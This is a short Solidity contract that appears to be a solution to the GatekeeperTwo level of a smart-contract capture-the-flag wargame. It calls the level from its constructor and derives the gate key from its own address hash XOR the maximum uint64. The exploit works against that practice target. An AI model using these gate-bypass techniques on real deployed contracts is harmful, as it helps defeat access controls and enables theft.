// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../levels/GatekeeperTwo.sol";
import {console2} from "forge-std/console2.sol";

contract GatekeeperTwoAttack {
    constructor(address _instance) {
        _attack(_instance);
    }

    function _attack(address _instance) internal {
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );

        GatekeeperTwo(_instance).enter(_gateKey);
    }
}
